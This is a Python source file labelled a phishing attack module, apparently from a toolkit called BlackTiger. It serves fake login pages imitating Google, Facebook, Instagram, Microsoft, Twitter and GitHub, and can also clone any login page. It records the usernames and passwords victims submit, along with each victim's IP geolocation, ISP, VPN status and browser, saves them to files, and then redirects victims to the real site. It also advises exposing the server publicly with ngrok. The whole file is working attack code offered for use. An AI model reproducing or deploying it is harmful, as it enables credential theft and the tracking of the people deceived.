#!/usr/bin/env python3
# Phishing Attack Module 

from flask import Flask, request, redirect, render_template_string
import json
import time
import os
import requests
import threading
import webbrowser
import socket
import re

PHISHING_TEMPLATES = {
    'Google': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Google Sign In</title>
<style>
body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2);width:400px;text-align:center}
.logo{font-size:32px;font-weight:500;color:#4285f4;margin-bottom:20px}
.input-group{margin:12px 0}
.input-group input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
.input-group input:focus{border-color:#4285f4;outline:none}
.btn{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
.btn:hover{background:#3367d6}
</style>
</head>
<body>
<div class="container">
<div class="logo">Google</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="email" placeholder="Email or phone" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://accounts.google.com'
    },
    'Facebook': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Facebook Login</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;width:396px;text-align:center}
.logo{font-size:48px;font-weight:bold;color:#1877f2;margin-bottom:20px}
.input-group{margin:8px 0}
.input-group input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
.input-group input:focus{border-color:#1877f2;outline:none}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.btn:hover{background:#166fe5}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="email" placeholder="Email or phone number" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://www.facebook.com'
    },
    'Instagram': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{font-family:Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border:1px solid #dbdbdb;border-radius:4px;width:350px;text-align:center}
.logo{font-size:42px;font-weight:600;font-family:Georgia,serif;margin-bottom:20px}
.input-group{margin:6px 0}
.input-group input{width:100%;padding:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px;font-size:14px}
.input-group input:focus{border-color:#a8a8a8;outline:none}
.btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer}
.btn:hover{background:#0077c2}
</style>
</head>
<body>
<div class="container">
<div class="logo">Instagram</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://www.instagram.com'
    },
    'Microsoft': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Microsoft Sign In</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:440px;text-align:center}
.logo{font-size:28px;font-weight:600;color:#0067b8;margin-bottom:20px}
.input-group{margin:12px 0}
.input-group input{width:100%;padding:12px;border:1px solid #ccc;border-radius:2px;font-size:15px}
.input-group input:focus{border-color:#0067b8;outline:none}
.btn{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;border-radius:2px;font-size:15px;cursor:pointer}
.btn:hover{background:#004e8c}
</style>
</head>
<body>
<div class="container">
<div class="logo">Microsoft</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="email" placeholder="Email, phone, or Skype" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://login.microsoftonline.com'
    },
    'Twitter': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>Twitter Login</title>
<style>
body{font-family:Arial,sans-serif;background:#e6ecf0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:8px;width:400px;text-align:center}
.logo{font-size:48px;color:#1da1f2;margin-bottom:20px}
.input-group{margin:10px 0}
.input-group input{width:100%;padding:12px;border:1px solid #e6ecf0;border-radius:4px;font-size:16px}
.input-group input:focus{border-color:#1da1f2;outline:none}
.btn{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:20px;font-size:16px;font-weight:bold;cursor:pointer}
.btn:hover{background:#0c85d0}
</style>
</head>
<body>
<div class="container">
<div class="logo">🐦</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="username" placeholder="Phone, email, or username" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log in</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://twitter.com'
    },
    'GitHub': {
        'html': '''<!DOCTYPE html>
<html>
<head><title>GitHub Sign In</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;background:#f6f8fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border-radius:6px;width:340px;text-align:center}
.logo{font-size:36px;font-weight:600;color:#24292e;margin-bottom:20px}
.input-group{margin:10px 0}
.input-group input{width:100%;padding:10px;border:1px solid #d1d5da;border-radius:4px;font-size:14px}
.input-group input:focus{border-color:#0366d6;outline:none}
.btn{width:100%;padding:12px;background:#2ea44f;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:bold;cursor:pointer}
.btn:hover{background:#22863a}
</style>
</head>
<body>
<div class="container">
<div class="logo">GitHub</div>
<form action="/login" method="POST">
<div class="input-group">
<input type="text" name="login" placeholder="Username or email" required>
</div>
<div class="input-group">
<input type="password" name="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
</div>
</body>
</html>''',
        'redirect': 'https://github.com'
    }
}

def get_ip_info(ip):
    info = {
        'ip': ip,
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown',
        'vpn': False,
        'proxy': False,
        'hosting': False
    }
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,hosting,mobile,query", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') != 'fail':
                info['country'] = data.get('country', 'Unknown')
                info['city'] = data.get('city', 'Unknown')
                info['isp'] = data.get('isp', 'Unknown')
                info['proxy'] = data.get('proxy', False)
                info['hosting'] = data.get('hosting', False)
    except:
        pass
    
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if 'error' not in data:
                info['country'] = data.get('country', info['country'])
                info['city'] = data.get('city', info['city'])
                info['isp'] = data.get('org', info['isp'])
    except:
        pass
    
    if info['proxy'] or info['hosting']:
        info['vpn'] = True
    
    return info

def get_browser_info(user_agent):
    browser = 'Unknown'
    os_info = 'Unknown'
    
    if not user_agent:
        return browser, os_info
    
    ua = user_agent.lower()
    
    if 'firefox' in ua:
        browser = 'Firefox'
    elif 'chrome' in ua and 'edg' not in ua:
        browser = 'Chrome'
    elif 'safari' in ua and 'chrome' not in ua:
        browser = 'Safari'
    elif 'edg' in ua:
        browser = 'Edge'
    elif 'opera' in ua or 'opr' in ua:
        browser = 'Opera'
    elif 'brave' in ua:
        browser = 'Brave'
    elif 'tor' in ua:
        browser = 'Tor Browser'
    
    if 'windows' in ua:
        os_info = 'Windows'
    elif 'mac' in ua:
        os_info = 'macOS'
    elif 'linux' in ua:
        os_info = 'Linux'
    elif 'android' in ua:
        os_info = 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        os_info = 'iOS'
    
    return browser, os_info

def open_browser():
    time.sleep(1)
    webbrowser.open('http://localhost:8080')

def run():
    print("\n" + "="*60)
    print("PHISHING MODULE - WITH IP, BROWSER, VPN DETECTION")
    print("="*60)
    
    template_names = list(PHISHING_TEMPLATES.keys())
    print("\nSelect template:")
    for i, name in enumerate(template_names, 1):
        print(f"  [{i:02d}] {name}")
    print("  [99] Custom URL clone")
    print("  [00] Back")
    
    choice = input("\n> ").strip()
    
    if choice == '00':
        return
    elif choice == '99':
        target = input("Target URL to clone: ").strip()
        redirect_url = input("Redirect URL (or press Enter for target): ").strip()
        if not redirect_url:
            redirect_url = target
        page_name = "Custom"
        try:
            r = requests.get(target, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            html = r.text
            html = html.replace('</form>', '<input type="hidden" name="__capture" value="1"></form>')
            html = html.replace('<form', '<form action="/login" method="POST"')
            print("[+] Page cloned successfully!")
        except Exception as e:
            print(f"[!] Failed to clone: {e}")
            html = '''<!DOCTYPE html>
<html>
<head><title>Login</title>
<style>
body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:#fff;padding:40px;border:1px solid #ddd;border-radius:8px;width:350px;text-align:center}
.input-group{margin:10px 0}
.input-group input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px}
.btn{width:100%;padding:12px;background:#333;color:#fff;border:none;border-radius:4px;cursor:pointer}
</style>
</head>
<body>
<div class="container">
<h2>Login</h2>
<form action="/login" method="POST">
<div class="input-group"><input type="text" name="email" placeholder="Email" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Login</button>
</form>
</div>
</body>
</html>'''
            redirect_url = target
    else:
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(template_names):
                print("Invalid choice")
                return
            page_name = template_names[idx]
            template = PHISHING_TEMPLATES[page_name]
            html = template['html']
            redirect_url = template['redirect']
        except ValueError:
            print("Invalid input")
            return
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
    except:
        local_ip = '127.0.0.1'
    s.close()
    
    print(f"\n[+] Phishing page ready: {page_name}")
    print(f"[+] Local URL: http://localhost:8080")
    print(f"[+] Local URL: http://{local_ip}:8080")
    print("[+] Expose with: ngrok http 8080  OR  serveo.net")
    print("[+] Credentials will be saved to ~/Downloads/BlackTiger_Output/")
    print("[+] Press CTRL+C to stop server")
    print("-"*60)
    
    app = Flask(__name__)
    
    @app.route('/')
    def index():
        return render_template_string(html)
    
    @app.route('/<path:path>', methods=['GET', 'POST'])
    def catch_all(path):
        if request.method == 'POST':
            return redirect('/login', code=307)
        return render_template_string(html)
    
    @app.route('/login', methods=['POST'])
    def login():
        data = dict(request.form)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        ip_info = get_ip_info(ip)
        browser, os_info = get_browser_info(user_agent)
        
        print(f"\n{'='*50}")
        print("[+] CREDENTIALS CAPTURED!")
        print(f"  Page: {page_name}")
        print(f"  IP: {ip}")
        print(f"  Country: {ip_info['country']}")
        print(f"  City: {ip_info['city']}")
        print(f"  ISP: {ip_info['isp']}")
        print(f"  Browser: {browser}")
        print(f"  OS: {os_info}")
        print(f"  VPN/Proxy: {' YES' if ip_info['vpn'] else 'NO'}")
        if ip_info['proxy']:
            print(f"  Proxy: YES")
        if ip_info['hosting']:
            print(f"  Hosting/VPN: YES")
        print(f"  User-Agent: {user_agent[:80]}...")
        for key, value in data.items():
            if key != '__capture' and value:
                print(f"  {key}: {value}")
        print(f"{'='*50}\n")
        
        out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
        os.makedirs(out_dir, exist_ok=True)
        
        log_entry = {
            "page": page_name,
            "ip": ip,
            "country": ip_info['country'],
            "city": ip_info['city'],
            "isp": ip_info['isp'],
            "browser": browser,
            "os": os_info,
            "vpn": ip_info['vpn'],
            "proxy": ip_info['proxy'],
            "hosting": ip_info['hosting'],
            "user_agent": user_agent,
            "data": data,
            "time": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with open(os.path.join(out_dir, "phishing_creds.json"), 'a') as f:
            f.write(json.dumps(log_entry) + "\n")
        
        with open(os.path.join(out_dir, "phishing_creds.txt"), 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Time: {log_entry['time']}\n")
            f.write(f"Page: {page_name}\n")
            f.write(f"IP: {ip}\n")
            f.write(f"Country: {ip_info['country']}\n")
            f.write(f"City: {ip_info['city']}\n")
            f.write(f"ISP: {ip_info['isp']}\n")
            f.write(f"Browser: {browser}\n")
            f.write(f"OS: {os_info}\n")
            f.write(f"VPN/Proxy: {'YES' if ip_info['vpn'] else 'NO'}\n")
            f.write(f"User-Agent: {user_agent}\n")
            for key, value in data.items():
                if key != '__capture' and value:
                    f.write(f"  {key}: {value}\n")
            f.write(f"{'='*50}\n")
        
        return redirect(redirect_url)
    
    threading.Thread(target=open_browser, daemon=True).start()
    
    try:
        app.run(host='0.0.0.0', port=8080, debug=False, threaded=True)
    except OSError as e:
        if "Address already in use" in str(e):
            print("\n[!] Port 8080 is already in use. Try killing the process:")
            print("    sudo kill $(sudo lsof -t -i:8080)")
        else:
            print(f"\n[!] Error: {e}")
    except KeyboardInterrupt:
        print("\n\n[+] Server stopped.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        print("[!] Install Flask: pip install flask")

if __name__ == "__main__":
    run()
